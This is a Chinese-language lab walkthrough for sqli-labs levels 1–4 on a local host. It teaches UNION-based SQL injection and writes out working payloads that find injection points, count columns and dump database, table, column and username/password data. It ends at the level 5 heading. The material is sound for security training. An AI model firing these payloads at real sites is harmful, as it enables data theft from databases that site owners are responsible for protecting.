# 

# Sqli-labs靶场实战

> 源码做了修改，把每关的sql语句打印出来方便学习：
>
> `echo $sql."</br>";`，做题时当作没看到

## 前提知识

- MySQL的查询语句是```SELECT * FROM 表名 WHERE 条件; --- 从某个表查询符合某个条件的所有数据```
  `*`可以换成你指定要查询的字段数据。
- 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个`information_schema`的数据库，在该库中，我们需要记住三个表名，分别是`schemata`，`tables`，`columns`。
  - Schemata 表**存储的是该用户创建的所有数据库的库名**，需要记住该表中记录数据库名的字段名为 `schema_name`。
  - Tables 表**存储该用户创建的所有数据库的库名和表名**，要记住该表中记录数据库 库名和表名的字段分别是 `table_schema`和 `table_name`。
  - Columns 表**存储该用户创建的所有数据库的库名、表名、字段名**，要记住该表中记录数据库库名、表名、字段名为 `table_schema`、`table_name`、`columns_name`。 


- `union`：MySQL中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。

- `group_concat()`：把数据分组连接(大概这么解释)。

- `order by 数字`：**把查询的数据按第n个字段排序。**

- `Database()`：查询当前网站使用的数据库。

​	

​	

## 第一关

### 判断有无注入点

`http://127.0.0.1/sqli-labs/Less-1/?id=1`页面正常

![](https://pic.imgdb.cn/item/64ceff441ddac507cc6062db.jpg)

`http://127.0.0.1/sqli-labs/Less-1/?id=1%27`页面报错，说明存在注入点

![](https://pic.imgdb.cn/item/64ceff9a1ddac507cc61638a.jpg)

上图可以看出网页将`1'`放到sql语句中，导致sql语句变成`SELECT * FROM users WHERE id='1'' LIMIT 0,1`，所以产生错误

​	

### 判断是数字型还是字符型

数字型的sql语句大概是：`SELECT * FROM users WHERE id=1 LIMIT 0,1`

字符型的sql语句大概是：`SELECT * FROM users WHERE id='1' LIMIT 0,1`

在看不到后端代码的情况下可以尝试：`http://127.0.0.1/sqli-labs/Less-1/?id=1'--+`

如果是数字型的sql语句会变成：`SELECT * FROM users WHERE id=1'--+ LIMIT 0,1`，`--+`是注释符，所以最终的sql语句会变成`SELECT * FROM users WHERE id=1'`，多个了`'`，页面还是报错

如果是字符型的sql语句会变成：`SELECT * FROM users WHERE id='1'--+' LIMIT 0,1` => `SELECT * FROM users WHERE id='1'`，页面变回正常

![](https://pic.imgdb.cn/item/64cf02561ddac507cc683048.jpg)

由上图可以判断是字符型，接下来的步骤必须在要拼接的sql语句前加上`'`、后面加上`--+`

例如：`http://127.0.0.1/sqli-labs/Less-1/?id=1'order by 3--+`

​	

### 判断有哪些字段回显到页面的哪些地方

#### 判断该表有几个字段

`order by`：把查询的数据按第n个字段排序。可以用它来判断`users`表一共有多少字段

`http://127.0.0.1/sqli-labs/Less-1/?id=1'order by 3--+`页面正常回显，说明可以按第3个字段排序，也就是至少有3个字段

`http://127.0.0.1/sqli-labs/Less-1/?id=1'order by 4--+`页面报错，说明无法按第4个字段排序，由此可以得出该表只有3个字段

#### 判断页面有哪些回显点

首先先让页面无回显，例如`?id=-1`(没有id=-1的数据)

![](https://pic.imgdb.cn/item/64cf9f411ddac507cce5006b.jpg)

使用联合查询`union select `：`http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3--+`

![](https://pic.imgdb.cn/item/64cfa0351ddac507cce83831.jpg)

`union`的特性：左右两边查询语句的字段数必须相同，这也就是为什么上一步要去推测`users`表有几个字段

由上图可以得出页面有两个回显点，分别是`2`和`3`的位置

​	

### 查询当前网站的数据库

随便选一个回显点来查询(2和3选一个)，例如`http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,database(),3--+`

![](https://pic.imgdb.cn/item/64cfa1431ddac507ccebbc93.jpg)

得到当前数据库名为`security`

​	

### 查询当前数据库下有哪些表

`http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="security"--+`

![](https://pic.imgdb.cn/item/64cfa37d1ddac507ccf2a9ad.jpg)

得到`security`库下有四个表：`emails`,`referers`,`uagernts`,`users`

​	

### 查询某个表下有哪些字段

`http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name="users"--+`

![](https://pic.imgdb.cn/item/64cfa53f1ddac507ccfa151b.jpg)

得到`users`表下有这些字段

​	

### 查询某个字段的值

`http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,password,3 from users--+`

![](https://pic.imgdb.cn/item/64cfa5a61ddac507ccfb9dfb.jpg)

得到`password`的值为：`Dumb`

​	

​	

## 第二关

`http://127.0.0.1/sqli-labs/Less-2/?id=1'`报错，说明有注入点

`http://127.0.0.1/sqli-labs/Less-2/?id=1'--+`，还是报错，说明是数字型，接下来就不用加`'`来闭合了，只需要在后面加`--+`来注释掉后面的sql语句：`LIMIT 0,1`

`http://127.0.0.1/sqli-labs/Less-2/?id=1 order by 3--+`，页面正常回显；`http://127.0.0.1/sqli-labs/Less-2/?id=1 order by 4--+`，页面报错，说明有3个字段

`http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,3--+`，得到回显位置

`http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,database(),3--+`得到数据库名

剩下步骤基本相同

​	

​	

## 第三关

`1'`页面报错，说明有注入点

![](https://pic.imgdb.cn/item/64cfa98c1ddac507cc08f247.jpg)

并且通过报错信息得知是单引号字符型且用括号闭合

```mysql
1') order by 3--+
-1') union select 1,2,3--+
-1') union select 1,database(),version()--+
-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
-1') union select 1,2,group_concat(username,id,password) from users--+
```

​	

​	

## 第四关

`1'`页面正常显示

`1"`页面报错，说明有注入点

![](https://pic.imgdb.cn/item/64cfabf91ddac507cc111909.jpg)

并且通过报错信息得知是双引号字符型且用括号闭合

```mysql
1") order by 3--+
-1") union select 1,2,3--+
-1") union select 1,database(),version()--+
-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
-1") union select 1,2,group_concat(username,id,password) from users--+
```

​	

​	

### 第五关


